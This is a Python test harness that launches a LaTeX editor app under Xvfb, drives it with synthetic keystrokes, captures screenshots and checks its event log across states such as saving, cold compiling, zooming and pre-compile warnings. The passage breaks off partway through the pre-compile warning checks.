#!/usr/bin/env python3
"""stills-run.py — mechanical still capture for the shell states.

Launches the app under Xvfb with a contained HOME, opens each fixture
hands-free (Ctrl+O; the `?project=` preset skips the dialog), drives
compile/failure with Ctrl+R, captures PNGs to OS tmp with `import`.
Stills themselves are filed artifacts for on-demand review (no pixel
assertions); the one exception is the app event log, asserted after
every state because no other harness launches the real app (the
driver only drives the headless sidecar, which never starts the
frontend log). State 4 compiles cold against an empty engine cache.
A 3000-page capture is not covered here; the driver's heavy-document
probes measure that case.

Env: STILLS_OUT (stills dir), STILLS_HOME (contained home, reusable so the
engine cache survives), STILLS_DISPLAY (:99), STILLS_PORT (vite, 1420),
STILLS_STATES (default "1 2 3 4 5 6 7 8 9 10 11"; 12 is the opt-in
worker-failure proof), STILLS_MIRROR_PORT /
STILLS_MIRROR_CACHE / STILLS_COLD_ONLINE (state 4's bundle host).
"""
import atexit
import json
import os
import shutil
import signal
import sqlite3
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import harness  # noqa: E402
from harness import AppLog, Procs, now_ms, xdo  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
IDENT = "io.github.wahahayes.maleficium"
REALHOME = os.path.expanduser("~")

OUT = os.environ.get("STILLS_OUT") or tempfile.mkdtemp(prefix="maleficium-stills-", dir="/tmp")
FAKEHOME = os.environ.get("STILLS_HOME") or tempfile.mkdtemp(prefix="maleficium-stills-home-", dir="/tmp")
DISP = os.environ.get("STILLS_DISPLAY", ":99")
PORT = int(os.environ.get("STILLS_PORT", "1420"))
STATES = os.environ.get("STILLS_STATES", "1 2 3 4 5 6 7 8 9 10 11").split()

os.makedirs(OUT, exist_ok=True)
os.makedirs(FAKEHOME, exist_ok=True)
# Pin every X tool at the harness display via the environment. Never touch
# the session.
os.environ["DISPLAY"] = DISP
os.environ["DEV_PORT"] = str(PORT)

procs = Procs()
LOCKS = []
APPLOG = AppLog(FAKEHOME, IDENT)


def log(msg):
    print("stills: " + msg, flush=True)


def die(msg):
    print("stills: FATAL " + msg, file=sys.stderr, flush=True)
    raise SystemExit(1)


def want(n):
    return str(n) in STATES


# ---- locks, cleanup ---------------------------------------------------------


def take_lock(path, what):
    """One run per display and per home: two runs on one display would share
    its Xvfb, sweep each other's apps and write one event log. mkdir is the
    atomic step; the pid inside lets a lock whose run is gone be taken over."""
    try:
        os.mkdir(path)
    except FileExistsError:
        holder = None
        try:
            holder = int(open(os.path.join(path, "pid")).read().strip())
            os.kill(holder, 0)
            die("%s is in use by stills run pid %d (pick another STILLS_DISPLAY / STILLS_HOME)" % (what, holder))
        except (ValueError, OSError):
            pass
        log("taking over stale lock %s (pid %s is gone)" % (path, holder or "none"))
        shutil.rmtree(path, ignore_errors=True)
        try:
            os.mkdir(path)
        except FileExistsError:
            die("lost the race for " + path)
    with open(os.path.join(path, "pid"), "w") as f:
        f.write(str(os.getpid()))
    LOCKS.append(path)


def cleanup():
    procs.stop_all()
    for p in LOCKS:
        shutil.rmtree(p, ignore_errors=True)


def sweep_stale():
    """Orphans from hard-killed runs: same binary name as a human's
    dev:desktop, so match this run's DISPLAY in their environ, nothing else
    (never a literal :99: a parallel run on another STILLS_DISPLAY lives there)."""
    r = subprocess.run(["pgrep", "-x", "maleficium"], capture_output=True, text=True)
    for pid in r.stdout.split():
        try:
            env = open("/proc/%s/environ" % pid, "rb").read().split(b"\0")
        except OSError:
            continue
        if ("DISPLAY=" + DISP).encode() in env:
            log("sweeping stale harness app " + pid)
            try:
                os.kill(int(pid), signal.SIGKILL)
            except ProcessLookupError:
                pass


def reclaim():
    subprocess.run(["sh", os.path.join(ROOT, "scripts", "reclaim.sh")], capture_output=True)


# ---- the app under test -----------------------------------------------------

app = None  # the running harness app: Popen
WIN = ""
LAUNCH_MS = 0
PRESET = os.path.join(OUT, ".preset")


def start_app(project, cache=None, data=None, bundle_url=None):
    """Point the run's vite at the preset (empty: a launch with no preset), then
    launch the built app against it. A `cache` / `data` gives this launch its
    own app cache / data home."""
    global app, LAUNCH_MS
    sweep_stale()
    with open(PRESET, "w") as f:
        f.write(project)
    LAUNCH_MS = now_ms()
    log("launching (preset %s)" % os.path.basename(project) if project else "launching (no preset)")
    # Toolchain homes stay real (rustup has no default under a fresh HOME);
    # everything the app writes stays contained via HOME. Compositing off: no
    # compositor runs under Xvfb and WebKit will not map otherwise.
    env = {k: v for k, v in os.environ.items() if not k.startswith("XDG_")}
    env.update(HOME=FAKEHOME, RUSTUP_HOME=REALHOME + "/.rustup", CARGO_HOME=REALHOME + "/.cargo",
               DISPLAY=DISP, GDK_BACKEND="x11", WEBKIT_DISABLE_COMPOSITING_MODE="1")
    env.pop("WAYLAND_DISPLAY", None)
    if cache:
        env["XDG_CACHE_HOME"] = cache
    if data:
        env["XDG_DATA_HOME"] = data
    if bundle_url:
        env["MALEFICIUM_DEV_BUNDLE_URL"] = bundle_url
    app = procs.start([os.path.join(BIN_DIR, "maleficium")], cwd=os.path.join(ROOT, "src-tauri"), env=env,
                      stdout=open(os.path.join(OUT, "dev.log"), "a"), stderr=subprocess.STDOUT)


def wait_window(timeout):
    """Bare Xvfb runs no window manager, so the maximized shell never maps
    itself: find it unmapped, force-map, then proceed. Activation is skipped
    (no WM to honor it)."""
    global WIN
    end = time.time() + timeout
    while time.time() < end:
        # The app owns a 10x10 helper window in the same class: take the
        # largest match, never the first.
        best, win = 0, ""
        for cand in xdo(DISP, "search", "--name", "^Maleficium$").split():
            geo = xdo(DISP, "getwindowgeometry", cand)
            size = [ln.split()[-1] for ln in geo.splitlines() if "Geometry:" in ln]
            if size:
                w, h = (int(x) for x in size[0].split("x"))
                if w * h > best:
                    best, win = w * h, cand
        if win:
            WIN = win
            xdo(DISP, "windowmap", win)
            # Refuse a black still: the map must actually take effect.
            vend = time.time() + 30
            while time.time() < vend:
                if win in xdo(DISP, "search", "--onlyvisible", "--name", "^Maleficium$").split():
                    break
                time.sleep(0.3)
            log("window " + win)
            return
        time.sleep(2)
    log("visible on %s at timeout: %s" % (DISP, " ".join(xdo(DISP, "search", "--onlyvisible", "--name", ".*").split())))
    die("no app window appeared (see %s/dev.log)" % OUT)


def key(*keys):
    """Focus first: unfocused synthetic keys never reach the menu handler
    without a window manager. Failures tolerated throughout."""
    xdo(DISP, "windowraise", WIN)
    xdo(DISP, "windowfocus", "--sync", WIN)
    xdo(DISP, "key", "--window", WIN, *keys)
    time.sleep(1)


def click_at(x, y, *extra):
    xdo(DISP, "mousemove", "--window", WIN, str(x), str(y), "click", *extra, "1")


def click_editor():
    """Menu accelerators (Ctrl+O) work at GTK level; webview-bound chords
    (Ctrl+R) need the editor widget focused: click into it first."""
    click_at(450, 200)
    time.sleep(1)


def shot(name, strict=True):
    """Per-window capture: root captures tear while webkit repaints. Bounded:
    a dead window must fail loudly, never hang the harness."""
    path = os.path.join(OUT, name + ".png")
    try:
        r = subprocess.run(["import", "-display", DISP, "-window", WIN, path], capture_output=True, timeout=60)
        ok = r.returncode == 0
    except subprocess.TimeoutExpired:
        ok = False
    if strict:
        if not ok:
            die("capture failed: " + name)
        log("captured %s.png" % name)


def window_size(w, h):
    xdo(DISP, "windowsize", WIN, str(w), str(h))
    time.sleep(2)


def stop_app():
    """Belt and suspenders: group-kill our tree, then sweep anything on the
    display (a human dev:desktop never lives there, so this is precise)."""
    global app
    if app:
        procs.stop(app, grace=3)
        app = None
    sweep_stale()
    reclaim()


def palette(text, x=400):
    """Type `text` into the command palette, then Return. The palette's input
    is centered, so a wider window clicks further right."""
    key("ctrl+shift+p")
    time.sleep(2)
    click_at(x, 91)
    time.sleep(1)
    xdo(DISP, "type", "--delay", "40", text)
    time.sleep(1)
    xdo(DISP, "key", "Return")


# ---- the app's event log ----------------------------------------------------


def events(path=None):
    a = AppLog(FAKEHOME, IDENT)
    if path:
        a.path = path
    return a.events()


def acts(evs):
    return [e.get("event") or {} for e in evs]


def wait_event(action, since, timeout, applog=None):
    """Wait on what the app says happened instead of a fixed sleep; a timeout
    fails loudly by name. Timestamps, not line counts: the log accumulates
    across launches."""
    if not (applog or APPLOG).wait(action, since, timeout):
        die("no %s event within %ss" % (action, timeout))


def seen(action, since):
    return APPLOG.find(action, since) is not None


def check_log(req):
    """The log accumulates across launches (rotation, never truncation), so the
    launch's segment starts at its last log.open; every line in the file must
    still be valid JSON with an actor."""
    path = APPLOG.path
    if not os.path.isfile(path):
        die("no app event log at " + path)
    lines = [ln for ln in open(path).read().splitlines() if ln.strip()]
    if not lines:
        die("app event log check failed: log is empty")
    evs = []
    for i, ln in enumerate(lines):
        try:
            e = json.loads(ln)
        except ValueError:
            die("app event log check failed: line %d is not JSON: %s" % (i + 1, ln[:120]))
        if not (isinstance(e.get("at"), (int, float)) and isinstance(e.get("message"), str)):
            die("app event log check failed: line %d lacks at/message" % (i + 1))
        evs.append(e)
    actions = [e["event"].get("action") if isinstance(e.get("event"), dict) else e.get("dropped") for e in evs]
    bad = [i + 1 for i, e in enumerate(evs) if e.get("actor") not in ("user", "agent", "system")]
    if bad:
        die("app event log check failed: lines without an actor: %s" % bad[:10])
    opens = [i for i, a in enumerate(actions) if a == "log.open"]
    if not opens:
        die("app event log check failed: no log.open")
    seg = actions[opens[-1]:]
    missing = [a for a in req.split() if a not in seg]
    if missing:
        die("app event log check failed: missing actions: %s (have %s)" % (missing, sorted({str(a) for a in seg})))
    print("stills: app log ok: %d lines, launch actions %s" % (len(lines), ",".join(sorted({str(a) for a in seg}))))
    log("checked %s (%s present)" % (path, req))


def open_project():
    """Ctrl+O opens the preset project; returns once its main file is loaded.
    The frontend's log.open says it is up; a first launch on a cold display can
    still drop the chord, so it is pressed again (re-opening the preset is
    harmless)."""
    wait_event("log.open", LAUNCH_MS, 60)
    m = now_ms()
    for t in range(1, 4):
        key("ctrl+o")
        if APPLOG.wait("file.open", m, 10):
            time.sleep(1)
            return
        log("no file.open after Ctrl+O (try %d)" % t)
    die("Ctrl+O never opened the preset project")


def run_driver(out_name, rounds, root_override):
    """The headless MCP driver against the run's contained home."""
    env = dict(os.environ, HOME=FAKEHOME, RUSTUP_HOME=REALHOME + "/.rustup", CARGO_HOME=REALHOME + "/.cargo",
               DRIVER_CACHE=FAKEHOME + "/.cache", MCP_ROOT_OVERRIDE=root_override,
               DRIVER_LOG=os.path.join(OUT, out_name), WARM_ONLY="1", POLL_ROUNDS=str(rounds))
    r = subprocess.run(["bash", os.path.join(ROOT, "e2e", "driver-run.sh")], env=env,
                       stdout=open(os.path.join(OUT, "dev.log"), "a"), stderr=subprocess.STDOUT)
    return r.returncode == 0


def since_events(since, path=None):
    return [e for e in (events(path) if path else APPLOG.events()) if e.get("at", 0) > since]


# ---- states -----------------------------------------------------------------


def state1():
    """Default: open, no compile. Idle shell + quiet preview. Ctrl+S forces a
    save so the log carries file.save + revision.record live."""
    start_app(FIX + "/simple")
    wait_window(300)
    open_project()
    click_editor()
    msave = now_ms()
    key("ctrl+s")
    wait_event("file.save", msave, 15)
    time.sleep(1)
    shot("01-default")

    # Revision-echo: the save must not read as an external change; a real
    # external edit right after it must.
    def saved_external():
        """The file the last Ctrl+S saved, and how many fs.external events this
        launch's log segment holds for it. Own-write suppression is
        content-matched, so the save alone must leave that count at 0."""
        a = acts(APPLOG.events())
        opens = [i for i, x in enumerate(a) if x.get("action") == "log.open"]
        seg = a[opens[-1]:] if opens else a
        saves = [x["path"] for x in seg if x.get("action") == "file.save"]
        assert saves, "no file.save in the log"
        p = saves[-1]
        return p, sum(1 for x in seg if x.get("action") == "fs.external" and x.get("path") == p)

    p, n = saved_external()
    if n != 0:
        die("own save reported as external (%d fs.external for %s)" % (n, p))
    with open(p, "a") as f:
        f.write("% external edit\n")
    end = time.time() + 15
    while True:
        p, n = saved_external()
        if n >= 1:
            break
        if time.time() >= end:
            die("external edit after a save was swallowed (%s)" % p)
        time.sleep(0.3)
    log("echo check: save silent, external edit reported (%d) for %s" % (n, p))
    # The save auto-compiles: hold the app until the preview has painted it.
    wait_event("preview.page-render", msave, 120)
    stop_app()
    # The compiled pdf must load in pdf.js and paint a page: a preview stuck on
    # 'loading...' (e.g. its worker never started) fails here, not in a still.
    check_log("log.open file.save revision.record fs.external compile.auto preview.pdf-load preview.page-render")


def state2():
    """Compiling: pre-compile the fixture through the sidecar so OPEN warms
    into a live compile by itself (no keystroke race). Rapid stills through the
    warm run, then a settled done-still."""
    log("pre-warming engine cache via driver")
    if not run_driver("driver-warm.jsonl", 150, FIX + "/simple"):
        die("warm driver failed")
    mopen = now_ms()
    start_app(FIX + "/simple")
    wait_window(300)
    open_project()
    # Stills through the warm compile, every 5 s, up to 8; one more after the
    # compile finishes and the rest would be the same picture.
    done_seen = False
    i = 0
    while i < 8:
        i += 1
        shot("02-compiling-%d" % i, strict=False)
        if done_seen:
            break
        done_seen = seen("compile.finish", mopen)
        time.sleep(5)
    log("captured 02-compiling-{1..%d}.png" % i)
    # An agent recompiles the open project over MCP: the preview must notice
    # the rewritten pdf and reload by itself.
    mopen = now_ms()
    if not run_driver("driver-external.jsonl", 60, FIX + "/simple"):
        die("external compile driver failed")
    # Both after the driver started: the reload renders again on its own.
    wait_event("preview.external-update", mopen, 30)
    wait_event("preview.page-render", mopen, 30)
    time.sleep(1)
    shot("02-compiling-done")
    stop_app()
    check_log("log.open compile.finish offline.readiness preview.external-update preview.pdf-load preview.page-render")
    # The warm run compiled from the cache alone: the badge must read Ready
    # offline (02-compiling-done shows it) and the bus must say so.
    states = [e.get("state") for e in acts(APPLOG.events()) if e.get("action") == "offline.readiness"]
    if not (states and states[-1] == "ready"):
        die("no ready-offline readiness after the cached-only recompile (states: %s)" % states)
    log("offline readiness after the warm recompile: " + states[-1])


def state3():
    """Failure: bad project, focus, Ctrl+R (bundles warm by now)."""
    start_app(FIX + "/bad")
    wait_window(300)
    open_project()
    click_editor()
    mrun = now_ms()
    key("ctrl+r")
    wait_event("compile.finish", mrun, 120)
    time.sleep(2)
    shot("03-failure")
    stop_app()
    check_log("log.open compile.finish")


def state4():
    """Cold compile: an empty engine cache of its own, Ctrl+R, stills while the
    first compile downloads until the log says it finished. The status bar must
    read the phase and a live download count. The downloads come from
    e2e/bundle-mirror.py, a read-through cache of the bundle host kept across
    runs (STILLS_MIRROR_CACHE): the app's cache is empty, the network is not
    needed after the mirror's first fill. STILLS_COLD_ONLINE=1 skips the mirror
    and downloads for real."""
    cold_url = None
    mirror = None
    if not os.environ.get("STILLS_COLD_ONLINE"):
        mport = int(os.environ.get("STILLS_MIRROR_PORT", PORT + 100))
        mcache = os.environ.get("STILLS_MIRROR_CACHE", "/var/tmp/maleficium-bundle-mirror")
        mirror = harness.start_mirror(procs, OUT, HERE, mport, mcache)
        cold_url = "http://127.0.0.1:%d/tlextras-2022.0r0.tar" % mport
        log("bundle mirror on :%d (%s)" % (mport, mcache))
    start_app(FIX + "/simple", cache=FIX + "/cold-cache", bundle_url=cold_url)
    wait_window(300)
    mcold = now_ms()
    open_project()
    click_editor()
    key("ctrl+r")
    i = 0
    while i < 60:
        i += 1
        time.sleep(8)
        shot("04-cold-%d" % i, strict=False)
        if seen("compile.finish", mcold):
            break
    log("captured 04-cold-{1..%d}.png" % i)
    shot("04-cold-done")
    stop_app()
    check_log("log.open compile.phase compile.fetch compile.finish")
    evs = acts(since_events(mcold))
    names = [e.get("action") for e in evs]
    if "compile.finish" not in names:
        die("cold compile did not report its phases and downloads (no compile.finish)")
    end = names.index("compile.finish")
    phases = [e.get("phase") for e in evs[:end] if e.get("action") == "compile.phase"]
    fetched = sum(1 for e in evs[:end] if e.get("action") == "compile.fetch" and e.get("outcome") == "fetched")
    if phases[:1] != ["first-compile"] or "tex" not in phases or "xdvipdfmx" not in phases or fetched <= 0 \
            or evs[end].get("ok") is not True:
        die("cold compile did not report its phases and downloads (phases %s, %d fetched, finish %s)"
            % (phases[:8], fetched, evs[end]))
    print("stills: cold compile: %d fetches, phases %s" % (fetched, ",".join(dict.fromkeys(phases))))
    if mirror:
        procs.stop(mirror, grace=3)
        lines = open(os.path.join(OUT, "mirror.log")).read().splitlines()
        hits = sum(1 for ln in lines if ln.startswith("mirror: hit "))
        fetched_up = sum(1 for ln in lines if ln.startswith("mirror: fetched "))
        if hits + fetched_up <= 0:
            die("the cold compile never went through the bundle mirror")
        log("bundle mirror: %d hits, %d fetched upstream" % (hits, fetched_up))


def state5():
    """First run: a data home with no recent projects and no preset opens the
    welcome tour without building it; Help > Welcome then builds it, and a
    template double-clicked in the gallery lands in the home folder, opens with
    its main file, and builds."""
    firstrun = FIX + "/first-run-data"
    firstlog = AppLog(firstrun, IDENT)
    firstlog.path = os.path.join(firstrun, IDENT, "maleficium-log", "events.jsonl")
    os.makedirs(firstrun, exist_ok=True)
    shutil.rmtree(FAKEHOME + "/article", ignore_errors=True)

    def finishes(n, timeout):
        """Wait for `n` compile.finish events in the first-run log."""
        end = time.time() + timeout
        got = 0
        while time.time() < end:
            got = sum(1 for e in acts(firstlog.events()) if e.get("action") == "compile.finish")
            if got >= n:
                return
            time.sleep(3)
        log("only %d compile.finish events after %ds" % (got, timeout))

    mlaunch = now_ms()
    start_app("", cache=FAKEHOME + "/.cache", data=firstrun)
    wait_window(300)
    wait_event("project.open", mlaunch, 60, firstlog)
    time.sleep(2)
    shot("05-welcome")
    # Synthetic keys sent to a window never reach the palette's input: click it
    # to focus it, then type to whatever has focus.
    palette("from template")
    time.sleep(3)
    shot("05-gallery")
    key("Escape")
    time.sleep(2)
    palette("welcome")
    finishes(1, 240)
    time.sleep(3)
    shot("05-welcome-built")
    palette("from template")
    time.sleep(3)
    # A double-click on a card creates it at the shown location (home).
    xdo(DISP, "mousemove", "--window", WIN, "167", "200", "click", "--repeat", "2", "--delay", "200", "1")
    finishes(2, 300)
    time.sleep(3)
    shot("05-created")
    stop_app()

    evs = acts(firstlog.events())
    names = [e.get("action") for e in evs]
    if "template.welcome" not in names:
        die("first run did not open the welcome tour (actions %s)" % sorted({str(a) for a in names}))
    roots = [e.get("root", "") for e in evs if e.get("action") == "project.open"]
    if not any(r.endswith("maleficium-welcome") for r in roots):
        die("first run did not open the welcome tour (welcome project not opened: %s)" % roots)
    print("stills: first run opened the welcome tour: " + roots[-1])

    w = [i for i, a in enumerate(names) if a == "template.welcome"]
    fin = [e for e in evs if e.get("action") == "compile.finish"]
    want_root = os.path.join(os.path.realpath(FAKEHOME), "article")
    made = [e for e in evs if e.get("action") == "template.create"]
    mains = [e.get("mainFile") for e in evs if e.get("action") == "main.resolved" and e.get("root") == want_root]
    problems = []
    if len(w) < 2:
        problems.append("Help > Welcome did not reopen the tour")
    else:
        first = names[w[0]:w[1]]
        if "compile.warm-skipped" not in first or "compile.finish" in first:
            problems.append("first run built the tour: %s" % first)
    if not (fin and fin[0].get("ok") is True and str(fin[0].get("target", "")).endswith("maleficium-welcome/welcome.tex")):
        problems.append("welcome build: %s" % fin[:1])
    if not (made and made[-1].get("root") == want_root):
        problems.append("template root %s, want %s" % (made[-1:], want_root))
    if mains != [want_root + "/main.tex"]:
        problems.append("main for the new project: %s" % mains)
    if not (len(fin) >= 2 and fin[1].get("ok") is True and fin[1].get("target") == want_root + "/main.tex"):
        problems.append("template build: %s" % fin[1:2])
    if not os.path.isfile(want_root + "/main.tex"):
        problems.append("no main.tex in the new project")
    if problems:
        die("welcome or template project did not open with a main file and build: " + "; ".join(problems))
    print("stills: Help > Welcome built the tour; %s opened with main.tex and built" % want_root)


def state6():
    """Zoom: step the preview to 50%, 150% and 300% with the zoom chords and
    capture each. Every settled zoom must be followed by a fresh render of the
    visible page (a stretched stale bitmap fails here)."""

    def last_zoom():
        z = [e["percent"] for e in acts(APPLOG.events()) if e.get("action") == "preview.zoom"]
        return int(z[-1]) if z else -1

    def page1_rendered_since(since):
        return APPLOG.find("preview.page-render", since, lambda ev: ev.get("page") == 1) is not None

    def zoom_settled():
        """The app works through queued chords slower than xdotool sends them:
        read the zoom only once two looks 0.5 s apart agree (bounded)."""
        prev = last_zoom()
        for _ in range(40):
            time.sleep(0.5)
            cur = last_zoom()
            if cur == prev:
                break
            prev = cur
        return prev

    def zoom_to(target):
        """The whole distance in one burst of chords (each is one 10% step),
        then single steps to correct any rounding, bounded; the log says where
        it is. Settles on the page-1 re-render, not a fixed wait."""
        t0 = now_ms()
        cur = last_zoom()
        if cur == -1:
            # A fit mode logs no percent yet: one step toward the target to read one.
            xdo(DISP, "key", "--window", WIN, "ctrl+minus")
            cur = zoom_settled()
        if cur != -1 and cur != target:
            k = "ctrl+equal" if cur < target else "ctrl+minus"
            d = abs(target - cur)
            xdo(DISP, "key", "--window", WIN, "--repeat", str((d + 9) // 10), "--delay", "60", k)
        for _ in range(20):
            cur = zoom_settled()
            if cur == target:
                break
            xdo(DISP, "key", "--window", WIN, "ctrl+equal" if cur < target else "ctrl+minus")
        if last_zoom() != target:
            die("zoom did not reach %d%% (at %d%%)" % (target, last_zoom()))
        end = time.time() + 15
        while not page1_rendered_since(t0):
            if time.time() >= end:
                die("zoom to %d%%: page 1 never re-rendered" % target)
            time.sleep(0.3)
        # The log check below counts a zoom as settled only if the next one
        # comes 2 s later; hold that gap so each captured zoom is proven.
        time.sleep(2)

    def scroll_preview(down, right):
        """Wheel notches down/right over the preview, onto body text."""
        xdo(DISP, "mousemove", "--window", WIN, "320", "400")
        xdo(DISP, "click", "--repeat", str(down), "--delay", "80", "5")
        xdo(DISP, "click", "--repeat", str(right), "--delay", "80", "7")
        time.sleep(2)

    start_app(FIX + "/simple")
    wait_window(300)
    # A wide preview: full-size window, Preview Only layout (through the palette).
    window_size(1600, 900)
    open_project()
    click_editor()
    key("ctrl+s")
    end = time.time() + 180
    while not APPLOG.find("preview.page-render", 0):
        if time.time() >= end:
            die("the preview never painted a page")
        time.sleep(2)
    palette("preview only", x=800)
    time.sleep(3)
    zoom_to(50)
    shot("06-zoom-50")
    zoom_to(150)
    scroll_preview(4, 4)
    shot("06-zoom-150")
    zoom_to(300)
    scroll_preview(10, 10)
    shot("06-zoom-300")
    key("ctrl+0")
    time.sleep(3)
    stop_app()
    check_log("log.open preview.zoom preview.page-render")
    evs = [(e["at"], e.get("event") or {}) for e in APPLOG.events()]
    zooms = [(at, e["percent"]) for at, e in evs if e.get("action") == "preview.zoom"]
    settled = [(at, p, zooms[i + 1][0] if i + 1 < len(zooms) else float("inf"))
               for i, (at, p) in enumerate(zooms)
               if i + 1 == len(zooms) or zooms[i + 1][0] - at >= 2000]
    if not settled:
        die("a settled zoom left the visible page unrendered (no settled zoom in the log)")
    for at, p, until in settled:
        pages = [e["page"] for t, e in evs if e.get("action") == "preview.page-render" and at < t < until]
        if 1 not in pages:
            die("a settled zoom left the visible page unrendered (zoom to %s%% at %s: renders %s)" % (p, at, pages))
    print("stills: every settled zoom re-rendered page 1: %s" % ",".join("%s%%" % p for _, p, _ in settled))


def state7():
    """Render churn, counted in the app log. A portrait paper: fit page renders
    each page once and then holds still, one zoom step renders each page once,
    and scrolling at a fixed zoom renders nothing. A landscape beamer deck: its
    first open renders page 1 once, at the page's own aspect."""
    marks = {}

    def mark(name):
        marks[name] = now_ms()

    def wheel(button, notches):
        """Button 4 up, 5 down, over the preview pane."""
        xdo(DISP, "mousemove", "--window", WIN, "1330", "400")
        xdo(DISP, "click", "--repeat", str(notches), "--delay", "150", str(button))

    def open_compiled(project, prefix):
        """Open at fit width, save to compile, wait for paint. The paint wait is
        anchored at launch: the log accumulates across runs, so an unanchored
        grep would pass on a stale render."""
        start_app(project)
        wait_window(300)
        mlaunch = now_ms()
        window_size(1600, 900)
        open_project()
        click_editor()
        key("ctrl+0")
        mark(prefix + "-open")
        key("ctrl+s")
        wait_event("preview.page-render", mlaunch, 600)
        time.sleep(5)

    open_compiled(FIX + "/simple", "portrait")
    mark("portrait-fitpage")
    palette("fit page", x=800)
    time.sleep(4)
    mark("portrait-hold")
    time.sleep(6)
    mark("portrait-step")
    click_editor()
    key("ctrl+equal")
    time.sleep(4)
    mark("portrait-scroll")
    wheel(5, 15)
    wheel(4, 15)
    time.sleep(3)
    mark("portrait-done")
    shot("07-portrait")
    stop_app()
    portrait = APPLOG.events()
    os.makedirs(FIX + "/beamer", exist_ok=True)
    # The app instantiates template projects with the build-time shared
    # overlays (core/build.rs); the bare main.tex alone cannot compile.
    shutil.copy(ROOT + "/src-tauri/templates/beamer/main.tex", FIX + "/beamer/main.tex")
    for shared in ("maleficium-slides.sty", "maleficium-footer.sty", "maleficium-mark.pdf"):
        shutil.copy(ROOT + "/src-tauri/templates/shared/" + shared, FIX + "/beamer/" + shared)
    open_compiled(FIX + "/beamer", "beamer")
    shot("07-beamer-open")
    mark("beamer-scroll")
    wheel(5, 30)
    time.sleep(3)
    mark("beamer-done")
    stop_app()
    beamer = APPLOG.events()
    with open(os.path.join(OUT, "07-marks"), "w") as f:
        f.write("".join("%s %d\n" % kv for kv in marks.items()))
    for name, evs in (("07-portrait.jsonl", portrait), ("07-beamer.jsonl", beamer)):
        with open(os.path.join(OUT, name), "w") as f:
            f.write("".join(json.dumps(e) + "\n" for e in evs))

    def renders(evs, a, b):
        return [e.get("event") or {} for e in evs
                if (e.get("event") or {}).get("action") == "preview.page-render" and marks[a] <= e["at"] < marks[b]]

    def pages(rs):
        c = {}
        for r in rs:
            c[r["page"]] = c.get(r["page"], 0) + 1
        return c

    rows = [
        ("portrait fit page", pages(renders(portrait, "portrait-fitpage", "portrait-hold"))),
        ("portrait fit page held 6s", pages(renders(portrait, "portrait-hold", "portrait-step"))),
        ("portrait zoom step", pages(renders(portrait, "portrait-step", "portrait-scroll"))),
        ("portrait scroll", pages(renders(portrait, "portrait-scroll", "portrait-done"))),
        ("beamer first open", pages(renders(beamer, "beamer-open", "beamer-scroll"))),
        ("beamer scroll", pages(renders(beamer, "beamer-scroll", "beamer-done"))),
    ]
    for name, c in rows:
        print("stills: renders per page, %-26s %s" % (name + ":", dict(sorted(c.items())) or "none"))
    r = dict(rows)
    bad = []
    if r["portrait fit page"].get(1) != 1 or max(r["portrait fit page"].values(), default=0) > 1:
        bad.append("fit page must render each page once")
    if r["portrait fit page held 6s"]:
        bad.append("fit page held still must render nothing")
    if r["portrait zoom step"].get(1) != 1 or max(r["portrait zoom step"].values(), default=0) > 1:
        bad.append("a zoom step must render each page once")
    if r["portrait scroll"]:
        bad.append("scrolling at a fixed zoom must render nothing already painted")
    if r["beamer first open"].get(1) != 1:
        bad.append("the beamer deck must open with one page-1 render")
    if max(r["beamer scroll"].values(), default=0) > 1:
        bad.append("scrolling the deck must render no page twice")
    p1 = [x for x in renders(beamer, "beamer-open", "beamer-scroll") if x.get("page") == 1]
    if p1 and "width" in p1[0]:
        aspect = p1[0]["width"] / p1[0]["height"]
        print("stills: beamer page 1 backing %dx%d (aspect %.3f)" % (p1[0]["width"], p1[0]["height"], aspect))
        # The beamer template declares aspectratio=169, so 16:9 it is.
        if not 1.74 < aspect < 1.81:
            bad.append("beamer page 1 must render at its 16:9 aspect")
    if bad:
        die("preview render counts are off (table above): " + "; ".join(bad))
    print("stills: render counts ok")


PRECHECK_BASE = "\\documentclass{article}\n\\usepackage{nopkgmaleficium}\n\\usepackage{biblatex}\n"


def state8():
    """Pre-compile warnings. A document asking for a package outside the bundle
    and for biber pops the warnings panel after Ctrl+R, once per finding set;
    "Don't show this again" turns the popup off, so a changed set stays quiet,
    Tools > Show Pre-compile Warnings still opens it, and Escape closes it."""
    main = FIX + "/precheck/main.tex"
    os.makedirs(FIX + "/precheck", exist_ok=True)
    with open(main, "w") as f:
        f.write(PRECHECK_BASE + "\\begin{document}\nx\n\\end{document}\n")
    # A reused STILLS_HOME keeps the popup setting of an earlier run: start on.
    import glob
    for db in glob.glob("%s/.local/share/%s/localstorage/*.localstorage" % (FAKEHOME, IDENT)):
        c = sqlite3.connect(db)
        c.execute("DELETE FROM ItemTable WHERE key = ?", ("maleficium.precheckPopup.v1",))
        c.commit()
        c.close()
    start_app(FIX + "/precheck")
    wait_window(300)
    window_size(1600, 900)
    open_project()
    click_editor()
    m_first = now_ms()
    key("ctrl+r")
    wait_event("precheck.panel-shown", m_first, 120)
    wait_event("compile.finish", m_first, 300)
    time.sleep(2)
    shot("08-precheck-panel")
    click_editor()
    m_same = now_ms()
    key("ctrl+r")
    wait_event("compile.finish", m_same, 300)
    time.sleep(1)
    # The panel's footer row sits 40px above the window bottom, 16px in from the
    # right, 440px wide: the checkbox leads it and Close ends it.
    click_at(1176, 836)
    time.sleep(1)
    shot("08-precheck-dont-show")
    click_at(1540, 836)
    wait_event("precheck.panel-dismissed", m_same, 20)
    # A changed set: the edit lands on disk; the clean buffer reloads it.
    m_new = now_ms()
    with open(main, "w") as f:
        f.write(PRECHECK_BASE + "\\usepackage{minted}\n\\begin{document}\nx\n\\end{document}\n")
    wait_event("file.reload", m_new, 20)
    click_editor()
    m_quiet = now_ms()
    key("ctrl+r")
    wait_event("compile.finish", m_quiet, 300)
    time.sleep(2)
    palette("pre-compile warnings", x=800)
    wait_event("precheck.panel-shown", m_quiet, 20)
    time.sleep(1)
    shot("08-precheck-request")
    m_esc = now_ms()
    key("Escape")
    wait_event("precheck.panel-dismissed", m_esc, 10)
    stop_app()

    evs = APPLOG.events()

    def between(a, b=None):
        return [e["event"] for e in evs if isinstance(e.get("event"), dict) and e["at"] > a and (b is None or e["at"] <= b)]

    def only(es, name):
        return [e for e in es if e.get("action") == name]

    def check(cond, msg):
        if not cond:
            die("pre-compile warnings panel check failed: " + msg)

    shown = only(between(m_first), "precheck.panel-shown")
    check([e["via"] for e in shown] == ["auto", "request"], "panel shows: %s" % shown)
